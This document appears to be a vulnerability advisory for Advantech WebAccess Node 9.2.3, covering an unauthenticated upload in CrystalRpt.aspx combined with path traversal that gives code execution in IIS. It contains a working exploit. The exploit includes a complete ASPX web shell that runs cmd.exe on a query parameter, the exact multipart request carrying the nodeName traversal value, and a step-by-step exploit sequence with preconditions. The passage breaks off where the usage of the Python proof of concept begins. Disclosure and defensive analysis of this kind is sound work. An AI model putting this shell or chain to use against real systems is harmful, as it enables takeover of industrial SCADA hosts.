# Advantech WebAccess Node 9.2.3 — Unauthenticated File Upload in `CrystalRpt.aspx` Combined with Path Traversal → Code Execution in the IIS Worker Process

## 1. Overview

### Overview of the product

Advantech WebAccess, from Advantech (Taiwan), is a closed-source industrial SCADA/HMI web server used for real-time monitoring in manufacturing, and therefore sits in the critical-infrastructure segment that a single web-facing defect can bridge directly into operational technology. The build examined here is **WebAccess Node 9.2.3**, obtained from the distributed installer `AdvantechWebAccessNode_9.2.3.exe` — a 1.9 GB PE32 InstallShield ScriptDriven self-extracting archive.

The web tier is not one application but several, all hosted by IIS under a single site rooted at `broadweb`:

| Application | Technology | Role |
|---|---|---|
| `broadweb/*.asp` | classic ASP | operator login (`broadweb/user/signinonly.asp`) and SCADA pages |
| `waconfig90` | ASP.NET MVC / Web API | configuration console; controller-level `[WaAuth]` filter, session plus csrfToken, parameterised queries |
| `BWMobileService` | WCF REST | mobile API |
| `WaCrpt` | ASP.NET Web Forms | Crystal Reports viewing **and report upload** — the component in this finding |
| `WaExlViewer` | ASP.NET Web Forms | spreadsheet viewing |

Two in-process COM helpers are also registered for the classic-ASP tier: `webdobj.webdraw`, whose `RemoteWinExec` reaches `drawcom.dll!CreateProcessA` with a fixed command line and no shell, and `aspvbobj.include`, whose `VBWinExec` entry point is a previously published and vendor-fixed issue (see Independence in section 10). The data backends are SQL Server SQLEXPRESS and Microsoft Access `.mdb` files.

### Overview of the finding

`WaCrpt/CrystalRpt.aspx` exposes a Web Forms upload handler in which the two defects compound. `Page_Load`, the entry point that runs on every request to the page, performs **no authorization decision at all**: it tests only that the form fields `projName` and `nodeName` are non-empty and, when one of them is empty, issues a `Response.Redirect` toward the operator login page — a navigation aid, not an access control. `fileSubmit_Click`, the button handler, writes the submitted file to disk with **no extension validation of any kind**, and does so *before* it attempts to open the file as a Crystal Report.

The destination directory is built by string concatenation from two attacker-supplied form fields:

```csharp
mapPath    = "~/report/" + projName + "_" + nodeName + "/";
rptDirPath = HttpContext.Current.Server.MapPath(mapPath);
```

The only guard between that computation and the write is `Directory.Exists(rptDirPath)`, whose purpose is to check that the report project has been provisioned. Sending `nodeName = \..\..\` makes `Server.MapPath` normalise the result to the **WaCrpt application root itself**, a directory that always exists, so the guard is satisfied with no report project configured and no report directory present. The upload therefore lands in a served, script-executing IIS application directory rather than in the quarantined `report\<project>_<node>\` subtree the handler was written for.

The chain completes on the client's next request. The uploaded file carries an `.aspx` extension and its bytes are served by the same IIS application, so ASP.NET's build manager compiles it on first request and executes it inside `w3wp.exe` under the application pool identity. In the verification environment that identity was `nt authority\system`.

### Overview of the verification posture and its limits

Everything in section 9 was produced by deploying the **shipped WaCrpt application files**, as documented in the research record, into a real IIS instance and driving them over HTTP with a pure-stdlib client. The vulnerable code — `bin\WaCrpt.dll`, `CrystalRpt.aspx`, `Web.config` — ran unmodified. A **complete default installation of WebAccess Node 9.2.3 was never performed**: the self-extracting installer hung in Session 0, so the deployment was surgical rather than end-to-end. Two consequences follow and are carried explicitly through this advisory rather than smoothed over. First, the site-level `/broadweb/...` URL shape, the shipped IIS site configuration and the interaction with the rest of the product were not exercised over a stock install. Second, the `nt authority\system` execution identity is the identity of the *verification* application pool; the shipped default pool identity was not established from any artifact, and the corrected statement in the underlying research record reaches the same conclusion after an adversarial pass. Section 3 and section 12 state precisely which claims rest on distribution artifacts as documented in the research record and which rest on inference plus lab reproduction, and section 12 publishes a second, lower reading for the configuration in which the inference does not hold.

## 2. Vulnerability Summary

### Vulnerability summary in one paragraph

A remote attacker who can reach the page without credentials sends three HTTP requests to a single Web Forms page. The first obtains the page's `__VIEWSTATE` and `__EVENTVALIDATION` pair while simultaneously establishing — through a path-traversal value in `nodeName` — that the write destination is the application root. The second carries a multipart body containing an ASP.NET page body under the field name `FileUpload1`; the handler saves it verbatim to the application root and then throws while trying to parse it as a report, returning HTTP 500 after the bytes are already on disk. The third request to the saved `.aspx` executes it. (The verification transcript in section 9 shows a fourth request — an additional command issued to prove that arbitrary commands run rather than one hardcoded command. The chain itself needs three.) Total elapsed effort: three HTTP requests, no credentials, no user interaction, no race window, no memory corruption. "Without credentials" means that no authorization decision exists anywhere in the application, which section 3 proves from artifacts, and that anonymous authentication on the hosting site is structurally required by the product's own login page. Section 3 also records the one gap: the research contains no `applicationHost.config` excerpt, so anonymous authentication being enabled for the `WaCrpt` application path specifically is inference plus lab reproduction rather than an artifact-proven factory default, and section 12 prices that configuration separately.

### Summary table of the salient facts

| Field | Value |
|---|---|
| Type | Unrestricted file upload (CWE-434) compounded by path traversal (CWE-22), on a page with no authorization decision (CWE-306) |
| Component | `WaCrpt` ASP.NET Web Forms application, served under `/broadweb/WaCrpt/` |
| Endpoint | `POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1` |
| Sink | `WaCrpt.CrystalRpt.fileSubmit_Click` → `FileUpload1.SaveAs(filePath)` in `bin\WaCrpt.dll` |
| Tainted sources | `Request.Form["projName"]`, `Request.Form["nodeName"]`, `FileUpload1.FileName`, and the uploaded file content handed to `FileUpload1.SaveAs` |
| Authentication | none performed by the page (see section 3 for the artifact basis and its limits) |
| Traversal payload | `projName=x`, `nodeName=\..\..\` — exactly two `..` levels |
| Write location | `<install-dir>\broadweb\WaCrpt\` (the IIS application root, script-executing) |
| Execution trigger | `GET /broadweb/WaCrpt/shell.aspx?c=<command>` |
| Execution identity observed | `nt authority\system` in the verification environment; not asserted for a shipped default install (see the identity analysis in section 10) |
| Observable side effect | HTTP 500 on the upload request — a red herring; the write succeeded |
| Affected version | WebAccess Node 9.2.3 as distributed; other versions were not enumerated |
| CVSS 3.1 | **9.8 Critical**, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (derivation in section 12) |

### Summary of the two independent defects

The finding is not one bug but two, and either alone would be materially less severe:

- **Missing access control on the page.** `Page_Load` never establishes who the caller is. Eight sibling files in the same module do call a session-existence check (`isSessionExist`); `CrystalRpt.cs` does not appear among them. The upload feature is consequently exposed to any caller who can reach the page rather than restricted to authenticated operators. No claim is made here about where that page is normally reachable from: section 11 records the opposite consideration, that a SCADA web interface is rarely intended to be reachable from a business network, let alone the internet.
- **Unrestricted write with an attacker-influenced destination.** `fileSubmit_Click` validates neither the extension of the uploaded name nor the containment of the computed directory. The sibling upload point in the same module, `addTemplate.cs`, *does* enforce `string.Compare(strA, "RPT", ignoreCase: true) == 0`. Two upload handlers written in the same module, one checking and one not, is the signature of an omission rather than of a design decision.

### Summary of what an attacker gains

A web shell running in `w3wp.exe` under the application pool identity of the product's own web tier. On a SCADA node that is the process which already serves the HMI, so the attacker inherits whatever authority that process holds over the host and over the product's configuration and runtime data — in the verified case, `nt authority\system` with `SeTcbPrivilege`, `SeDebugPrivilege`, `SeImpersonatePrivilege` and `SeBackupPrivilege` enabled. The shell is reachable thereafter on the same port and URL namespace as ordinary product traffic.

## 3. Authentication Boundary

### Authentication boundary established from distribution artifacts

Three artifacts of the shipped distribution bear directly on whether an anonymous caller reaches `CrystalRpt.aspx`. They are quoted here because this project has previously had to correct an advisory that presented a laboratory instance's configuration as a factory default, and the distinction is load-bearing. On provenance: the research record documents the installer and its size, documents an unpacked deployment archive holding these files, and asserts that the files are the real product's — but it does not log the extraction step itself. They are therefore described below as the shipped files as documented in the research record, rather than as artifacts whose provenance chain was recorded end to end.

**Artifact 1 — the shipped application-level `Web.config` for `WaCrpt`.** The research record preserves exactly three authentication-relevant facts from that file: an ASP.NET authentication *mode* is declared, no `<authorization>` deny rule is present, and no custom authentication module is registered. Nothing else from the file was recorded, so nothing else is reproduced below:

```xml
<!-- AN EXCERPT: the three authentication-relevant facts recorded for the
     shipped <install-dir>\broadweb\WaCrpt\Web.config. This is not a
     reproduction of the file's full content - the research record preserves
     exactly these three facts from that file and nothing else from it -->
<configuration>
  <system.web>
    <!-- FACT 1, present: an authentication mode declaration -->
    <authentication mode="Windows" />
    <!-- FACT 2, absent: NO <authorization> element, therefore no
         <deny users="?" />, so ASP.NET does not reject anonymous callers
         at the application level -->
    <!-- FACT 3, absent: NO custom authentication <httpModules> /
         <modules> entry -->
  </system.web>
</configuration>
```

`<authentication mode="Windows" />` in ASP.NET is a *declaration of which authentication scheme the application understands*; it is not enforcement. Enforcement is either IIS-level authentication on the site or application, or an `<authorization>` deny rule, or code. The shipped `WaCrpt` configuration contains none of the three.

**Artifact 2 — no `global.asax` in the shipped `WaCrpt` directory.** `global.asax` is where an ASP.NET application would hook `Application_AuthenticateRequest` or `Application_AuthorizeRequest` to impose a site-wide gate. Within this product only the `WaWebService` application ships one. `WaCrpt` has no application-level request pipeline hook that could authenticate a caller before the page runs.

**Artifact 3 — the shipped `Page_Load` itself.** Decompiled from `bin\WaCrpt.dll`:

```csharp
protected void Page_Load(object sender, EventArgs e) {
    if (firstLoad) {
        firstLoad = false;
        NameValueCollection form = base.Request.Form;
        if (!string.IsNullOrEmpty(form["projName"])) projName = form["projName"];
        else base.Response.Redirect("/broadweb/user/signinonly.asp");
        if (!string.IsNullOrEmpty(form["nodeName"])) nodeName = form["nodeName"];
        else base.Response.Redirect("/broadweb/user/signinonly.asp");
        if (!string.IsNullOrEmpty(projName) && !string.IsNullOrEmpty(nodeName)) {
            mapPath = "~/report/" + projName + "_" + nodeName + "/";
            rptDirPath = HttpContext.Current.Server.MapPath(mapPath);
        }
    }
    if (string.IsNullOrEmpty(rptDirPath) || !Directory.Exists(rptDirPath)) return;
    /* renders the upload form when upload=1 and Session["report"] is null */
}
```

There is no session lookup, no cookie inspection, no token validation, no `[WaAuth]` attribute, no principal check. The only two conditionals read string form values, and their failure branch is `Response.Redirect` — which sets a `Location` header and lets the request continue. Redirecting an anonymous caller to the login page is a user-experience gesture; it is not an access decision, and in any case the attacker simply supplies both parameters and never reaches that branch. The contrast with `waconfig90`, whose controllers are decorated with `[WaAuth]` and which validates session plus csrfToken, shows the product does possess an authentication mechanism — this page is not enrolled in it. Eight sibling source files in the same module call `isSessionExist`; `CrystalRpt.cs` does not. The research record also lists `CrystalRpt.cs` on the module's no-authentication list. The record states those two observations side by side without asserting that one causes the other, and this advisory does not assert it either.

### Authentication boundary that rests on inference, stated as such

Whether IIS accepts an anonymous TCP connection and hands it to the `WaCrpt` application at all is decided by **IIS-level authentication settings**, which live in the site's `applicationHost.config` section for that path — not in any artifact above. **The research record contains no `applicationHost.config` excerpt, no installer-authored IIS configuration fragment, and no vendor documentation statement that proves anonymous authentication is enabled for the `WaCrpt` application on a default install.** That specific claim was not evidenced from an artifact and is not asserted here as a proven factory default.

What the record does contain is a structural argument, and it is a strong one:

- The product's own operator login page, `broadweb/user/signinonly.asp`, must be reachable by an unauthenticated user — a login page that requires authentication cannot be used. That page is served by the same IIS site as `WaCrpt`.
- The research reproduced the exposure by enabling anonymous authentication on the deployed site, and characterises that choice as aligning the lab with the product's own required configuration for the login page, not as creating an artificial bypass.
- The application-level artifacts above prove that *if* IIS delivers an anonymous request to `WaCrpt`, nothing downstream of IIS stops it from reaching `fileSubmit_Click`.

So the accurate statement of the boundary is: **there is no authentication decision anywhere in the application** (artifact-proven), and **anonymous authentication on the hosting site is required for the product's own login page to function** (structurally necessary, inferred for the `WaCrpt` application specifically rather than read from an installer configuration file). An administrator who has explicitly disabled anonymous authentication on the `WaCrpt` application path, or who has fronted it with a gateway that requires a session, would not be exposed on this vector — and section 12 prices that configuration separately.

### Authentication boundary of the follow-up request

The `GET` that executes the uploaded page carries no credentials either. ASP.NET's build manager compiles and runs any `.aspx` inside an application root regardless of authorization metadata on the page, and the attacker-authored page contains none. The uploaded shell is therefore reachable by any principal that can reach the application — the same population as the upload step. The two halves of the chain share one boundary condition; there is no second gate to cross.

### Authentication boundary compared with the rest of the tier

The `WaCrpt` page is the softest point in an otherwise unevenly defended tier. `waconfig90` enforces `[WaAuth]` at controller level and uses parameterised queries. `BWMobileService` exposes four unauthenticated WCF REST endpoints — `/WsVersion`, `/`, `/Time` and `/Login` — and its `Login` operation concatenates caller input into SQL, but that SQL executes against a Microsoft Access `.mdb` backend, which offers no `xp_cmdshell`-equivalent command-execution primitive, so the injection does not escalate to code execution and was ruled out as an RCE route. `WaCrpt` is the only component in the tier that combines an unauthenticated entry point with a filesystem write into a script-executing directory. Section 4 records the full exhaustion pass.

## 4. Attack Surface

### Attack surface enumeration

The research enumerated the product's web-facing components and classified each by whether it could carry an unauthenticated attacker to code execution:

| Component | Interface | Authentication posture | Outcome for this research |
|---|---|---|---|
| `broadweb/*.asp` | classic ASP | login page anonymous by necessity | hosting context for `WaCrpt`; two COM helpers reachable from here — no finding |
| `waconfig90` | ASP.NET MVC / Web API | `[WaAuth]` on controllers, session plus csrfToken, parameterised queries | authentication gate holds — ruled out |
| `BWMobileService` | WCF REST | **4 unauthenticated endpoints**: `/WsVersion`, `/`, `/Time`, `/Login` | `/Login` contains SQL injection, but the backend is a Microsoft Access `.mdb`, which provides no `xp_cmdshell` or equivalent — **not RCE**; exhausted and documented as a genuine injection without an escalation primitive |
| `WaCrpt` | ASP.NET Web Forms | none on `CrystalRpt.aspx` | unauthenticated upload with an attacker-controlled destination — **this finding** |
| `WaExlViewer` | ASP.NET Web Forms | not established in the record | spreadsheet viewer; no write primitive identified — not pursued to a finding |
| `webdobj.webdraw` | in-process COM | invoked from classic ASP | `RemoteWinExec` → `drawcom.dll!CreateProcessA`, fixed command line, no shell, no attacker-controlled argv — no injection surface |
| `aspvbobj.include` | in-process COM | invoked from classic ASP | `VBWinExec` — previously published and vendor-fixed; see Independence |

### Attack surface of the mobile service, exhausted rather than ignored

The `BWMobileService` result is worth stating in full because it is the negative result that gives the surface map its shape. Four REST operations require no authentication. `/Login` reaches a SQL statement built by concatenation, which is a real injection: the record establishes it and then stops, because the provider behind it is Microsoft Access. Access exposes neither `xp_cmdshell` nor an OLE-automation stored procedure surface comparable to SQL Server's, so there is no supported path from injected SQL to process creation on this backend. A second backend, SQL Server SQLEXPRESS, does exist in the product — but the mobile login path does not reach it. The injection is therefore recorded as a non-RCE finding and excluded from this advisory's chain, rather than being silently dropped. Had the mobile endpoint been wired to the SQL Server backend, the assessment would be different.

### Attack surface geometry of the vulnerable component

`WaCrpt` is an IIS *application*, not merely a directory: it has its own `Web.config`, its own `bin\` containing `WaCrpt.dll` and `Newtonsoft.Json.dll`, and its own application root resolved by `Server.MapPath("~")` to `<install-dir>\broadweb\WaCrpt\`. Three properties of that geometry matter:

- The application root is **inside the served URL namespace**. A file written there is retrievable at `/broadweb/WaCrpt/<name>`.
- The application root is **script-executing**. `.aspx` files there are not static content; the ASP.NET build manager compiles and runs them.
- The application root is **writable by the pool identity**, because the pool identity must write uploaded reports and the file list that `updateFileList()` refreshes.

A path traversal that escapes the intended `report\<project>_<node>\` subtree by *up to* two levels lands in exactly this directory. Escaping further — to `broadweb`, or above — is refused by the runtime, which is a constraint the exploit must respect and which section 6 documents.

### Attack surface preconditions

Nothing beyond network reachability of the web port is required. No report project needs to be created, no operator account needs to exist, no prior request needs to have been made to the product, and no state needs to be seeded on the server. The traversal is what removes the `Directory.Exists` precondition, and the record's independent falsification pass checked this specifically (angle 6: hidden preconditions — refuted; `nodeName=\..\..\` resolves to a directory that always exists).

## 5. Sink Identification

### Sink code path

The sink is a single call in a single method. Decompiled from the shipped `bin\WaCrpt.dll`, class `WaCrpt.CrystalRpt`, method `fileSubmit_Click` — the server-side handler bound to the `fileSubmit` button on the upload form:

```csharp
protected void fileSubmit_Click(object sender, EventArgs e) {
    if (FileUpload1.HasFile) {
        filePath = rptDirPath + FileUpload1.FileName;   /* no extension validation;
                                                           ASP.NET has already stripped
                                                           any client-side directory */
        FileUpload1.SaveAs(filePath);                   /* <== SINK: bytes reach disk */
        updateFileList();
        waCrptDoc = new ReportDocument();
        waCrptDoc.Load(filePath);                       /* throws on a non-.rpt file
                                                           -> HTTP 500, but the file
                                                           is already written        */
        CrystalReportViewer1.ReportSource = waCrptDoc;
        Session.Add("report", waCrptDoc);
    }
}
```

Four properties of these eleven lines make the sink exploitable:

1. **No extension check.** `FileUpload1.FileName` is used verbatim as the leaf of the destination path. Nothing inspects it, nothing rewrites it, nothing compares it against an allowed set. An `.aspx`, `.asmx`, `.ashx` or `.config` leaf is accepted as readily as `.rpt`.
2. **Save precedes validation.** `SaveAs` executes first; the only validation of any kind — `ReportDocument.Load`, which will reject a file that is not a Crystal Report — happens *afterward*. Reordering these two calls would have made the chain fail, because the invalid file would never have reached disk.
3. **The failure mode is a successful write.** `ReportDocument.Load(shell.aspx)` throws, the exception propagates out of the page handler, IIS returns **HTTP 500**. A tester watching status codes alone records a failed upload. The file is on disk and executable. The record's falsification pass treated this as the single most likely place for the chain to be wrong (angle 4) and refuted it against the IIS W3C log: two POSTs, 200 then 500, immediately followed by a 200 for the uploaded file, with the on-disk timestamp of the 510-byte shell matching the logged POST.
4. **The destination is the tainted variable, not a constant.** `rptDirPath` is computed in `Page_Load` from request form data (section 6). The sink trusts it without re-deriving or re-checking it.

### Sink defence that exists in a sibling file

The same module contains a second report-upload handler, `addTemplate.cs`, which does the check that `fileSubmit_Click` omits:

```csharp
/* addTemplate.cs - the sibling upload point in the same module */
if (string.Compare(strA, "RPT", ignoreCase: true) != 0) return;   /* only .RPT accepted */
```

This is the strongest evidence that the omission is a defect rather than a deliberate capability. Two upload paths in one module, written against the same feature ("upload a report"), one of which enforces a case-insensitive extension allowlist and one of which enforces nothing. The record's independent re-analysis reached the same reading on a separate pass over the decompiled sources, without access to the first pass's conclusion.

### Sink defence that does not exist

- No `Path.GetExtension` allowlist or denylist in `fileSubmit_Click`.
- No content sniffing: the saved bytes are never inspected against a Crystal Report `.rpt` structure before being written.
- No containment test: `rptDirPath` is never compared against the canonical root of the intended `report\` subtree, so a value that normalises outside it is used as-is.
- No canonicalisation and no `Path.GetFullPath(...).StartsWith(...)` guard.
- No server-side filename generation: the client's leaf name is preserved, so the attacker chooses both the extension and the on-disk name.
- No post-write cleanup on the `ReportDocument.Load` failure path. The exception unwinds; the file stays.
- ASP.NET request validation (`validateRequest`, on by default) does **not** defend this sink. Its filter targets HTML-dangerous sequences — `<`, `&#`, `<script>` and similar — in form and query values. It does not inspect for `\` or `..`, so the traversal in `nodeName` passes through untouched. The page body itself travels in a multipart file part. That request validation does not scan multipart file parts is general ASP.NET platform behaviour, given here as background rather than as a finding of this research; it was not separately exercised on this page.

### Sink behaviour under a non-report file

The observable sequence for the exploit's second request is: `HasFile` true → `SaveAs` succeeds → `updateFileList()` runs → `ReportDocument.Load` throws → unhandled exception → HTTP 500 body. The client sees a server error. The server has a 510-byte attacker-authored `.aspx` in its application root. This mismatch between the reported outcome and the actual outcome is the reason the chain needs the third request to be confirmed at all, and section 9 records both the 500 and the subsequent 200.

## 6. Source Identification

### Source parameter extraction

Every tainted value originates in the HTTP request body of a `multipart/form-data` POST. `Page_Load` reads them through `Request.Form`:

```csharp
NameValueCollection form = base.Request.Form;
if (!string.IsNullOrEmpty(form["projName"])) projName = form["projName"];
if (!string.IsNullOrEmpty(form["nodeName"])) nodeName = form["nodeName"];
```

The corresponding wire-level fields the attacker must send are:

```text
POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1 HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (WaCrpt-PoC)
Content-Type: multipart/form-data; boundary=----WacrptBoundary<epoch>
Content-Length: <n>

------WacrptBoundary<epoch>
Content-Disposition: form-data; name="projName"

x
------WacrptBoundary<epoch>
Content-Disposition: form-data; name="nodeName"

\..\..\
------WacrptBoundary<epoch>
Content-Disposition: form-data; name="__VIEWSTATE"

<1056-byte value harvested from the first response>
------WacrptBoundary<epoch>
Content-Disposition: form-data; name="__EVENTVALIDATION"

<92-byte value harvested from the first response>
------WacrptBoundary<epoch>
Content-Disposition: form-data; name="fileSubmit"

Upload
------WacrptBoundary<epoch>
Content-Disposition: form-data; name="FileUpload1"; filename="shell.aspx"
Content-Type: application/octet-stream

<510-byte ASP.NET page body>
------WacrptBoundary<epoch>--
```

### Source controllability, field by field

| Source | Reaches | Attacker control | Sanitisation applied |
|---|---|---|---|
| `Request.Form["projName"]` | concatenated into `mapPath` | total — only requirement is non-empty | none |
| `Request.Form["nodeName"]` | concatenated into `mapPath`, then `Server.MapPath` | total — and this is the field that carries the traversal | none; `validateRequest` ignores `\` and `..` |
| `Request.QueryString["upload"]` | selects whether the upload form is rendered | total | none required for the write itself |
| `FileUpload1.FileName` | leaf of `filePath` | total as to the leaf name, including the extension | ASP.NET's standard multipart handling strips any client-side directory component, keeping the leaf — which removes *client-path* traversal but leaves the attacker in full control of the extension |
| the uploaded file content, handed to `FileUpload1.SaveAs` | written verbatim to `filePath` | total | none |
| `__VIEWSTATE` / `__EVENTVALIDATION` | Web Forms event dispatch | must be echoed back from the first response | not attacker-derived; harvested |

The distinction between `FileUpload1.FileName` and `nodeName` is the whole shape of the bug. ASP.NET does sanitise the *filename* — an attacker cannot use `..\..\evil.aspx` in the `filename` parameter to escape, because the framework reduces it to `evil.aspx`. The attack therefore relocates the traversal to a different, entirely unsanitised field: `nodeName`, which is concatenated into the *directory* half of the destination path. The framework's filename normalisation is real and is bypassed by not relying on it.

### Source constraint discovered during verification — exactly two traversal levels

The traversal is bounded by the runtime, and the bound is not obvious:

```text
nodeName = \..\..\      ->  Server.MapPath("~/report/x_\..\..\/")
                            = <app-root>\report\x_\..\..\
                            -> <app-root>                    ACCEPTED, Directory.Exists = true

nodeName = \..\..\..\   ->  ASP.NET throws
                            HttpException: "Cannot use a leading .. to exit above the
                            top directory"
```

`Server.MapPath` refuses to resolve above the application root. Two levels of `..` are exactly enough to climb from `report\x_\` to the application root, and one level too many is rejected outright. The exploit is therefore not "unbounded path traversal to `C:\Windows`" but "bounded traversal from the report subtree to the application root" — which is nevertheless sufficient, because the application root is a served, script-executing directory. Any payload claiming arbitrary absolute-path write on this sink is wrong, and the shipped PoC defaults `--node-name` to the two-level form for that reason. The record's independent pass normalised the path with `[IO.Path]::GetFullPath("...\WaCrpt\report\x_\..\..\")` and obtained `...\WaCrpt\`, with `Directory.Exists` returning true even though the `report` directory itself did not exist.

### Source constraint discovered during verification — a User-Agent header is mandatory

```text
No User-Agent header sent
  -> CrystalDecisions ViewerGlobal.get_IsSafari() throws NullReferenceException
  -> the page fails while rendering the Crystal Reports viewer control
  -> the upload form is not rendered and __VIEWSTATE / __EVENTVALIDATION cannot be harvested
  -> the chain stalls at step 1
```

This is a defect in the report-viewer control, unrelated to the upload sink, but it is a hard precondition: the first request must carry a `User-Agent`. Any client that omits the header — a bare `curl` without `-A`, some HTTP libraries in their default configuration — fails and may lead a tester to conclude incorrectly that the target is not vulnerable. The shipped PoC sets `User-Agent: Mozilla/5.0 (WaCrpt-PoC)` on every request.

## 7. Data Flow

### Data flow end to end

```text
unauthenticated HTTP client
  |
  |  request 1: POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1
  |             multipart body: projName=x   nodeName=\..\..\
  |             mandatory header: User-Agent
  v
IIS site (anonymous authentication)  ->  ASP.NET Web Forms pipeline
  |   [anonymous authentication ON THIS application path is a structural
  |    inference + lab reproduction, NOT artifact-proven: the research
  |    record holds no applicationHost.config excerpt. See section 3]
  |   application: WaCrpt      application root: <install-dir>\broadweb\WaCrpt\
  v
WaCrpt.dll!WaCrpt.CrystalRpt.Page_Load                      [ NO authorization decision ]
  |   form["projName"] = "x"        -> projName
  |   form["nodeName"] = "\..\..\"  -> nodeName              *** tainted ***
  |   mapPath     = "~/report/" + projName + "_" + nodeName + "/"
  |               = "~/report/x_\..\..\/"
  |   rptDirPath  = Server.MapPath(mapPath)
  |               = <app-root>\report\x_\..\..\
  |               -> <app-root>                              *** tainted, normalised ***
  |   Directory.Exists(rptDirPath)  == true   (the application root always exists)
  |   upload == "1" and Session["report"] == null  ->  render upload form
  |
  v
response 1: HTTP 200, 6051 bytes
            contains __VIEWSTATE (1056 bytes), __EVENTVALIDATION (92 bytes), FileUpload1
  |
  |  request 2: POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1
  |             multipart body: __VIEWSTATE + __EVENTVALIDATION + projName + nodeName
  |                             + fileSubmit=Upload + FileUpload1(filename=shell.aspx)
  v
WaCrpt.dll!WaCrpt.CrystalRpt.fileSubmit_Click               [ NO extension validation ]
  |   FileUpload1.HasFile                        == true
  |   filePath = rptDirPath + FileUpload1.FileName
  |            = <app-root>\shell.aspx                        *** tainted + tainted ***
  |   FileUpload1.SaveAs(filePath)     <=========== SINK : 510 bytes written to disk
  |   updateFileList()
  |   new ReportDocument().Load(filePath)  ->  throws (not a Crystal Report)
  v
response 2: HTTP 500                                        *** red herring: write done ***
  |
  |  request 3: GET /broadweb/WaCrpt/shell.aspx?c=whoami
  v
ASP.NET build manager: first request for a .aspx with no compiled type
  |   compiles the attacker-authored page body in-process (csc / BuildManager)
  v
w3wp.exe, application pool identity
  |   Process p = new Process();
  |   p.StartInfo.FileName    = "cmd.exe";
  |   p.StartInfo.Arguments   = "/c " + Request.QueryString["c"];
  |   p.Start();  p.StandardOutput.ReadToEnd();
  v
response 3: HTTP 200
            <pre>nt authority\system</pre>
```

### Data flow sanitisation audit

Every hop between the network and the disk was inspected for a filter. The result is that there is none on the directory half of the path, and exactly one — the framework's own filename normalisation — on the file half:

| Hop | Value | Sanitiser present? |
|---|---|---|
| HTTP body → `Request.Form["projName"]` | `"x"` | no |
| HTTP body → `Request.Form["nodeName"]` | `"\\..\\..\\"` | no — ASP.NET request validation does not treat `\` or `..` as dangerous |
| `projName`+`nodeName` → `mapPath` | `"~/report/x_\\..\\..\\/"` | no — raw string concatenation |
| `mapPath` → `Server.MapPath` | normalises `..`, refuses to exceed the application root | the *only* constraint on the flow, and it bounds rather than blocks: two levels land inside the application root |
| `rptDirPath` → `Directory.Exists` | `true` | not a sanitiser — a provisioning check satisfied by the traversal |
| multipart `filename` → `FileUpload1.FileName` | `"shell.aspx"` | **yes** — ASP.NET strips any client-side directory component, keeping the leaf. Blocks filename-based traversal; does not constrain the extension |
| `rptDirPath + FileName` → `filePath` | `<app-root>\shell.aspx` | no containment test, no canonicalisation guard |
| `filePath` → `SaveAs` | writes 510 bytes | no content inspection, no extension allowlist |
| multipart body → the file content handed to `FileUpload1.SaveAs` | attacker page source | no — written verbatim |

### Data flow of the second request's state

The `firstLoad` guard in `Page_Load` computes `rptDirPath` only on the page's initial load, yet the write occurs on the later postback. The shipped PoC handles this by resending `projName` and `nodeName` together with the harvested `__VIEWSTATE` and `__EVENTVALIDATION` on the upload request, and the observed on-disk location of the written file — `<app-root>\shell.aspx` — confirms that the effective `rptDirPath` at write time was the application root. How exactly Web Forms page state carries the `rptDirPath` field across the postback (ViewState serialisation of the field, recomputation, or both) was **not traced** in this research, and no claim is made about that mechanism. The observable fact is the write location, which was verified both from the client side and on the target filesystem.

## 8. Exploit Construction

### Exploit payload

The uploaded file is a 510-byte ASP.NET page. It reads a command from the query string, runs it through `cmd.exe` with output redirection, waits for exit, and writes the captured stdout between `<pre>` tags so the client can extract it deterministically:

```aspx
<%@ Page Language="C#" %>
<%
string c = Request.QueryString["c"];
if (!string.IsNullOrEmpty(c)) {
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + c;
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.CreateNoWindow = true;
  p.Start();
  string o = p.StandardOutput.ReadToEnd();
  p.WaitForExit();
  Response.Write("<pre>" + (o ?? "(empty)") + "</pre>");
}
%>
```

The page declares no `@Page` authentication attribute, inherits nothing, and requires no code-behind, which is why the build manager can compile it from the file alone. `UseShellExecute = false` with `RedirectStandardOutput = true` is what makes stdout capturable; without it the child process writes to the worker's console and the client sees an empty response.

### Exploit sequence

```text
step 1  POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1
        body: projName=x, nodeName=\..\..\
        header: User-Agent (mandatory - see section 6)
        expect: HTTP 200
        harvest: __VIEWSTATE (1056 bytes), __EVENTVALIDATION (92 bytes)
        assert: the literal "FileUpload1" appears in the body

step 2  POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1
        body: harvested ViewState pair + projName + nodeName
              + fileSubmit=Upload + FileUpload1 (filename=shell.aspx, 510-byte page)
        expect: HTTP 500
        do NOT treat 500 as failure - SaveAs has already completed and
        ReportDocument.Load is what threw

step 3  GET  /broadweb/WaCrpt/shell.aspx?c=whoami
        expect: HTTP 200 with <pre>nt authority\system</pre>

step 4  GET  /broadweb/WaCrpt/shell.aspx?c=<marker echo> & hostname
        expect: HTTP 200 with the marker string, proving arbitrary command
                execution rather than a single hardcoded command
```

### Exploit preconditions

- Network reachability of the IIS site hosting `broadweb`, on whatever port the deployment binds. No credentials. No user interaction. No prior state on the server — the traversal removes the "a report project must exist" requirement.
- `nodeName` must carry **exactly two** `..` levels (section 6). Three or more produce `HttpException: Cannot use a leading .. to exit above the top directory`.
- Every request must carry a `User-Agent` header, or the first request dies inside `ViewerGlobal.get_IsSafari()` and no ViewState can be harvested.
- The upload request must echo back the `__VIEWSTATE` and `__EVENTVALIDATION` values harvested from the first response, and set `fileSubmit=Upload` so that Web Forms dispatches to `fileSubmit_Click`.
- The write is create-oriented in practice for this chain: the shipped PoC uses a fixed default leaf name `shell.aspx`, and the record does not establish whether `SaveAs` overwrites an existing file of the same name. Operators choosing a non-colliding name avoid the question entirely; the record does not support a claim about overwriting.

### Exploit usage

The shipped PoC, a parameterised re-implementation of the chain verified in section 9, is `exploit/advantech_webaccess_crystalrpt_unauth_file_upload_rce.py`. It is pure Python standard library, carries no hardcoded target, and parameterises the host, port, scheme, endpoint path, both form fields, the leaf name, the command payload and the confirmation marker:

```text
